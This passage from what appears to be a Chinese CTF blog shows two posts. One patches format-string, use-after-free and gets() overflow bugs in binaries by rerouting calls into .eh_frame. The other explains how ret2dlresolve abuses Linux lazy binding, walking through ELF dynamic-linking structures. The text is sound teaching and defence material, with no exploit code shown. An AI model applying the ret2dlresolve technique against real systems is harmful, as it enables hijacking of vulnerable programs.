<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000DEF call    read</span><br><span class="line">.text:0000000000000DF4 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000DF8 mov     rsi, rax        </span><br><span class="line">.text:0000000000000DFB mov     edi, offset unk_1 ; s</span><br><span class="line">.text:0000000000000E00 mov     eax, 0</span><br><span class="line">.text:0000000000000E05 call    __printf_chk</span><br><span class="line">.text:0000000000000E0A lea     rdi, aPleaseInputYou ; &quot;Please input your</span><br></pre></td></tr></table></figure></div>

<p>patch后</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000DEF call    read</span><br><span class="line">.text:0000000000000DF4 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000DF8 mov     rdi, rax        ; Keypatch modified this from:</span><br><span class="line">.text:0000000000000DF8                         ;   mov rsi, rax</span><br><span class="line">.text:0000000000000DFB nop                     ; s</span><br><span class="line">.text:0000000000000DFB                         ; Keypatch modified this from:</span><br><span class="line">.text:0000000000000DFB                         ;   mov edi, offset unk_1</span><br><span class="line">.text:0000000000000DFB                         ; Keypatch padded NOP to next boundary: 4 bytes</span><br><span class="line">.text:0000000000000DFC nop</span><br><span class="line">.text:0000000000000DFD nop</span><br><span class="line">.text:0000000000000DFE nop</span><br><span class="line">.text:0000000000000DFF nop</span><br><span class="line">.text:0000000000000E00 mov     eax, 0</span><br><span class="line">.text:0000000000000E05 call    puts            ; Keypatch modified this from:</span><br><span class="line">.text:0000000000000E05                         ;   call __printf_chk</span><br><span class="line">.text:0000000000000E0A lea     rdi, aPleaseInputYou ; &quot;Please input you</span><br></pre></td></tr></table></figure></div>

<p>反编译结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20190614190117757.png"
                      alt="image-20190614190117757"
                ></p>
<p>ps：某些情况下程序中可能没有 puts 函数，此时需要对 printf 函数进行一定程度的修改，在真正输出字符串之前先过滤，去掉非法字符串(例如 %p 等)，如何 patch 参考下面的内容。</p>
<p><strong>Patch2:</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[<span class="number">2</span> * v1]);                     <span class="comment">// uaf</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这是一个 UAF 漏洞，堆块指针保存在全局数组中，但是 free 的时候没有清除指针，导致 UAF。</p>
<p>patch 这种漏洞就不能直接在原来的代码基础上修改了，因为直接添加代码会导致指令被覆盖，破坏程序的正常功能。</p>
<p>这里用到上面提到的技巧，通过修改 call 指令劫持程序的控制流到 .eh_frame 段即添加的 fix 代码处，对 chunk_list 执行清空操作，然后正常调用 free 函数完成程序功能，最后通过强制跳转指令回到正常的控制流。</p>
<p>patch前：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000D79 lea     rax, chunk_list</span><br><span class="line">.text:0000000000000D80 mov     rax, [rdx+rax]</span><br><span class="line">.text:0000000000000D84 mov     rdi, rax        ; ptr</span><br><span class="line">.text:0000000000000D87 call    free</span><br><span class="line">.text:0000000000000D8C lea     rdi, aDone      ; &quot;Done!&quot;</span><br><span class="line">.text:0000000000000D93 call    p</span><br></pre></td></tr></table></figure></div>

<p>Patch后(在 .eh_frame 段添加了代码)：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eh_frame:00000000000011F9 ; START OF FUNCTION CHUNK FOR delete</span><br><span class="line">.eh_frame:00000000000011F9</span><br><span class="line">.eh_frame:00000000000011F9 loc_11F9:                               ; CODE XREF: delete+55↑j</span><br><span class="line">.eh_frame:00000000000011F9                 lea     rax, chunk_list</span><br><span class="line">.eh_frame:0000000000001200                 mov     rax, [rdx+rax]  ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001200                                         ;   add [rdx+52h], edi</span><br><span class="line">.eh_frame:0000000000001200                                         ; Keypatch padded NOP to next boundary: 2 bytes</span><br><span class="line">.eh_frame:0000000000001200                                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001200                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                 mov     qword ptr [rax], 0 ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   js short loc_1217</span><br><span class="line">.eh_frame:0000000000001204                                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001204                                         ;   mov r9, rax</span><br><span class="line">.eh_frame:0000000000001204                                         ; Keypatch padded NOP to next boundary: 2 bytes</span><br><span class="line">.eh_frame:0000000000001204                                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   nop</span><br><span class="line">.eh_frame:0000000000001204                                         ;   add [rbx], ebx</span><br><span class="line">.eh_frame:0000000000001204                                         ;   or al, 7</span><br><span class="line">.eh_frame:000000000000120B                 call    free            ; Keypatch modified this from:</span><br><span class="line">.eh_frame:000000000000120B                                         ;   or [rax+24000001h], dl</span><br><span class="line">.eh_frame:000000000000120B                                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line">.eh_frame:0000000000001210                 jmp     loc_D8C         ; Keypatch modified this from:</span><br></pre></td></tr></table></figure></div>

<p>patch 后反编译</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  v0 = <span class="number">2LL</span> * v3;</span><br><span class="line">  v1 = chunk_list[v0];</span><br><span class="line">  *chunk_list[v0] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>Patch3:</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(&quot;Input your Plaintext to be encrypted&quot;);</span><br><span class="line">gets(s);</span><br></pre></td></tr></table></figure></div>

<p>gets 栈溢出，如法炮制，修改 call gets 指令劫持控制流到 .eh_frame 段。但是这里有一个问题，此程序中只有 gets 函数能够接受用户输入，难道就无法 patch 了吗？</p>
<p>其实不然，因为还有 syscall 可以使用，通过 syscall 构造 read 函数，就能控制输入数据的长度，完成修复。</p>
<p>patch 前：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004009D1 lea     rax, [rbp+s]</span><br><span class="line">.text:00000000004009D5 mov     rdi, rax</span><br><span class="line">.text:00000000004009D8 mov     eax, 0</span><br><span class="line">.text:00000000004009DD call    _gets</span><br><span class="line">.text:00000000004009E2 jmp     loc_40</span><br></pre></td></tr></table></figure></div>

<p>patch 后：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eh_frame:0000000000400F7D ; START OF FUNCTION CHUNK FOR encrypt</span><br><span class="line">.eh_frame:0000000000400F7D</span><br><span class="line">.eh_frame:0000000000400F7D loc_400F7D:             ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F7D mov     rax, 3          ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F7D                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   mov eax, 3</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0BBh</span><br><span class="line">.eh_frame:0000000000400F7D                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84 mov     rbx, 0          ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 14h</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F84                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8B mov     rcx, rdi        ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F8B                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8B                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8B                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E mov     rdx, 40h        ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 1</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 7Ah</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 52h</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 0</span><br><span class="line">.eh_frame:0000000000400F8E                         ;   db 1</span><br><span class="line">.eh_frame:0000000000400F95 syscall                 ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F95                         ;   js short loc_400FA7</span><br><span class="line">.eh_frame:0000000000400F95                         ;   add [rbx], ebx</span><br><span class="line">.eh_frame:0000000000400F95                         ;   or al, 7</span><br><span class="line">.eh_frame:0000000000400F95                         ; Keypatch padded NOP to next boundary: 1 bytes</span><br><span class="line">.eh_frame:0000000000400F95                         ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F95                         ;   jmp loc_400AB4</span><br><span class="line">.eh_frame:0000000000400F95                         ; Keypatch padded NOP to next boundary: 3 bytes</span><br><span class="line">.eh_frame:0000000000400F97 jmp     loc_400AB4      ; Keypatch modified this from:</span><br><span class="line">.eh_frame:0000000000400F97 ; END OF FUNCTION CHUNK FOR encrypt ;   nop</span><br></pre></td></tr></table></figure></div>

<p>反编译代码：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(&quot;Input your Plaintext to be encrypted&quot;);</span><br><span class="line"> __asm &#123; syscall; Keypatch modified this from: &#125;  // read</span><br></pre></td></tr></table></figure></div>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Patch binary 的时候要注意不能使文件体积变动过大，否则很容易被判宕机，另外，针对不同的漏洞有不同的修复手段，但是总体上来看就是添加、删除代码的过程。patch 过程中注意不要破坏原有的功能（特别是堆栈、寄存器等运行环境），防止 check 不过，当遇到比较复杂的漏洞或者文件空间不足等情况，应该考虑使用如 LIEF 等工具直接替换整个函数。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Ret2 runtime_dlresolve</title>
    <url>/2019/05/02/Ret2runtime_dlresolve/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Ret2dlresolve 是高级 ROP 技巧之一，世界著名的黑客杂志 phrack 在某一期提到过这个攻击技巧，该手段用于没有较好的 gadget、函数、利用链的情况。ret2dlresolve 主要利用了 linux 下的延迟绑定机制，通过修改解析字符串，我们就可以控制最终解析出的函数，从而获取任意函数执行的能力。</p>
<span id="more"></span>

<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>这一攻击技巧的基础就是linux下的延迟绑定机制，所以首先我们来了解一下什么是延迟绑定。</p>
<p>程序员编写一个程序会导入各种各样的函数，例如我们编写一个 hello world C语言程序</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>程序员只编写了两句有意义的代码，其中 printf 函数不是我们自己写的，而是从 C语言标准库中导入的。当开发一个大型项目的时候，通常会从标准库中导入很多函数，而某些函数可能从来都不会被调用，为了增加程序的执行效率，linux 引入的延迟绑定这一概念，当程序第一次调用导入函数的时候才去 libc 中寻找对应的地址，并将地址写入 GOT 表中，那些没有被调用的函数就不绑定。已经绑定的函数再次调用则直接去 GOT 表中寻找就好了。</p>
<p>实现延迟绑定的主要函数是 _dl_runtime_resolve，它接受两个参数，分别是 linkmap 和 offset，这个函数我们放在下面讲，首先来了解一下 ELF 的格式信息。</p>
<h2 id="ELF-dynamic-节"><a href="#ELF-dynamic-节" class="headerlink" title="ELF .dynamic 节"></a>ELF .dynamic 节</h2><p>这个节包含关于动态链接的信息，PE 或者 ELF 在运行程序的时候都需要进行动态链接，因为源代码中可能调用了动态库中的一些函数，引用其他程序代码时，在编译或者链接阶段不能确定地址到底是什么，因为当程序加载到内存之后地址都是动态的，所以需要重新进行地址定位。</p>
<p>.dynamic 节在动态链接的 ELF 文件中大同小异，结构一般如下(从 IDA 中看)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:08049F14 ; ELF Dynamic Information</span><br><span class="line">LOAD:08049F14 ; ===========================================================================</span><br><span class="line">LOAD:08049F14</span><br><span class="line">LOAD:08049F14 ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14 ; Segment permissions: Read/Write</span><br><span class="line">LOAD:08049F14 LOAD            segment mempage public &#x27;DATA&#x27; use32</span><br><span class="line">LOAD:08049F14                 assume cs:LOAD</span><br><span class="line">LOAD:08049F14                 ;org 8049F14h</span><br><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482CCh&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;8048524h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F0Ch&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F10h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804822Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;51h&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;18h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;80482B4h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;80482ACh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;804828Ch&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;804827Eh&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure></div>

<p>里面包含许多子节，我们主要关注 DT_STRTAB、DT_SYMTAB、DT_JMPREL，这三项，他们是指向其他节的指针，DT_STRTAB 指向 .dynstr，DT_SYMTAB 指向 .dynsym，DT_JMPREL 指向 .rel.plt。</p>
<h2 id="rel-plt-节"><a href="#rel-plt-节" class="headerlink" title=".rel.plt 节"></a>.rel.plt 节</h2><p>从 IDA 中，这个节的结构为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:080482B4 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:080482B4                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482BC                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT memcpy</span><br><span class="line">LOAD:080482C4                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482C4 LOAD            ends</span><br></pre></td></tr></table></figure></div>

<p>每一行都是一个结构体，结构体定义为</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></div>

<p>第一个成员是指向 GOT 表的指针，第二个成员是 .dynsym 节的偏移。</p>
<h2 id="dynsym-节"><a href="#dynsym-节" class="headerlink" title=".dynsym 节"></a>.dynsym 节</h2><p>从 IDA 中来看，这个节的结构如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aMemcpy - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;memcpy&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804822C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804822C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804820C                            0&gt;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804822C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804821C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure></div>

<p>这个节的每一行也代表着一个结构体，定义如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure></div>

<p>针对导入函数来说，比较主要的是 st_name，它指向了当前符号在 .dynstr 节中的偏移量。</p>
<h2 id="dynstr-节"><a href="#dynstr-节" class="headerlink" title=".dynstr 节"></a>.dynstr 节</h2><p>这个节在 IDA 中结构如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0804822C ; ELF String Table</span><br><span class="line">LOAD:0804822C byte_804822C    db 0                    ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804822C                                         ; LOAD:080481EC↑o ...</span><br><span class="line">LOAD:0804822D aLibcSo6        db &#x27;libc.so.6&#x27;,0</span><br><span class="line">LOAD:08048237 aIoStdinUsed    db &#x27;_IO_stdin_used&#x27;,0   ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:08048246 aRead           db &#x27;read&#x27;,0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804824B aMemcpy         db &#x27;memcpy&#x27;,0           ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:08048252 aLibcStartMain  db &#x27;__libc_start_main&#x27;,0</span><br><span class="line">LOAD:08048252                                         ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048264 aGlibc20        db &#x27;GLIBC_2.0&#x27;,0</span><br><span class="line">LOAD:0804826E aGmonStart      db &#x27;__gmon_start__&#x27;,0   ; DATA XREF: LOAD:080481FC↑o</span><br></pre></td></tr></table></figure></div>

<p>没有结构体定义，这个节的数据全都是字符串，两两之间用 ‘\x00’ 分割，而且开头和结尾都是 ‘\x00’。</p>
<p>如果将以上介绍的结构用一张图片表示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve3.png"
                     
                ><br>几点注意：</p>
<ol>
<li>r_info 指的是对应的结构体在 .dynsym 节中的<strong>下标</strong>(并不完全是，一会再讨论)</li>
<li>st_name 指的是对应的字符串在 .dynstr 节中的<strong>偏移量</strong>，例如 .dynstr 节头部地址为 0x0804822C，目标字符串的地址是 0x08048246，那么 st_name &#x3D; 0x08048246 - 0x0804822C &#x3D; 26</li>
</ol>
<h2 id="第一次调用导入函数发生了什么"><a href="#第一次调用导入函数发生了什么" class="headerlink" title="第一次调用导入函数发生了什么"></a>第一次调用导入函数发生了什么</h2><p>关于 ELF 格式或者各种节的详细介绍我们这里不涉及了，主要来看看当第一调用某个系统函数的时候发生了什么。</p>
<p>在 linux 下随便找一个可执行程序，用 gdb 打开找到一个系统函数单步跟踪。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve.png"
                     
                ><br>以 read 函数为例，单步跟进。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve2.png"
                     
                ><br>红色方框圈出的就是主要代码，第一次调用 read 函数，首先会 jmp 到 GOT 表中寻找地址，但是此时 read 函数还没有被绑定到 GOT 表中。</p>
<p>然后执行了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push   0</span><br><span class="line">push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br></pre></td></tr></table></figure></div>

<p>两步操作，最后通过 jmp 指令跳转到 _dl_runtime_resolve 继续执行。实际上这两句 push 就是将函数的参数入栈，调用函数原型为 dl_runtime_resolve(link_map,0×0)，这个函数就会进行一系列操作解析出 read 函数的地址，将地址写入 read 的 GOT 表中，然后将控制权交给 read 继续执行。</p>
<h2 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h2><p>我们简单了解一下这个函数的执行过程，它的代码是由汇编编写的，内部主要调用了 _dl_fixup 函数，这个函数的实现在 glibc&#x2F;elf&#x2F;dl-runtime.c 中，感兴趣的同学可以阅读源代码。</p>
<p>当程序调用 _dl_runtime_resolve 的时候，这个函数首先根据 linkmap 定位 .dynamic 节的地址，并从中取出 .dynstr、.dynsym、.rel.plt 这三个节的指针，然后利用 .rel.plt 头部指针和传入的第二个参数 offset 定位 .rel.plt 中的 Elf32_Rel 结构体，例如上面的例子传入的偏移量是 0，在 .rel.plt 中找到零号结构体就是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br></pre></td></tr></table></figure></div>

<p>上面说了这个结构体包含两个成员，第一个是指向 GOT 表的指针 r_offset ，而第二个 r_info 的利用规则为 <code>r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，也就是说 0x107 &gt;&gt; 8 &#x3D; 0x1 作为 .dynsym 节中的下标，取得 Elf32_Sym 结构体。在本例中取到的就是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elf32_Sym &lt;offset aRead - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br></pre></td></tr></table></figure></div>

<p>(注意：.dynsym 节的第一个元素是 0)</p>
<p>取得 Elf32_Sym 结构之后，会根据 st_name 指针从 .dynstr 节中找到对应的字符串，这个 st_name 表示的是字符串相对 .dynstr 节起始地址的偏移量。例如本例中 st_name &#x3D; offset aRead - offset byte_804822C &#x3D; 0x08048246 - 0x804822C &#x3D; 26</p>
<p>当找到了字符串之后，会在 libc 中查找这个函数的地址，并将地址赋值给 Elf32_Rel 的 r_offset 成员(也就是指向 GOT 表的指针)。</p>
<p>最后 _dl_runtime_resolve 将控制权转移给解析出来的函数，完成对应的功能。</p>
<p>总结一下流程</p>
<ol>
<li>根据传入的 link_map 找到 .dynamic 节，并取出 .dynstr、.dynsym、.rel_plt 三个节。</li>
<li>根据传入的 offset 从 .rel_plt 中找到对应的 Elf32_Rel 结构体。</li>
<li>从 Elf32_Rel 结构体中找到 r_info 成员，根据这个成员的偏移量(r_info &gt;&gt; 8) 从 .dynsym 中找到 Elf32_Sym 结构体。</li>
<li>从 Elf32_Sym 结构体中找到 st_name 成员，根据这个偏移从 .dynstr 节中找到对应的字符串。</li>
